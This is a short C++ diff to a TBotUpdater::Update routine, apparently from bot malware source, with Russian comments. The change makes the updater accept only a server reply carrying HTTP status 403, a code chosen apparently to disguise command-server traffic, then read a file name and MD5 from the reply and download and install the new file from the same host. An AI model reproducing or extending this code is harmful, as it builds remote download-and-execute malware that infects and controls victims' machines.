@@ -399,22 +399,28 @@ void TBotUpdater::Update(DWORD &UpdateInterval)
 
 	string Buf;
 
+	HTTP.CheckOkCode = false;
     bool Done = HTTP.Post(URL, &Fields, Buf);
 
-	if (Done && !Buf.IsEmpty())
+	if (Done && HTTP.Response.Code == 403 && !Buf.IsEmpty())
 	{
 		// Выполняем обновление
 		TBotStrings Values;
 		Values.SetText(Buf);
 
+		string FileName = Values.GetValue("file_name");
+		MD5     = Values.GetValue("md5");
+
+
+
 		TURL URL;
 
 		URL.Host     = HTTP.Request.Host;
 		URL.Path     = "cfg";
-		URL.Document = Values.GetValue("file_name");
+		URL.Document = FileName;
 
 		string FileURL = URL.URL();
-			   MD5     = Values.GetValue("md5");
+
 
 		// Загружаем и устанавливаем новую версию
 		DownloadAndSetup(FileURL, MD5);
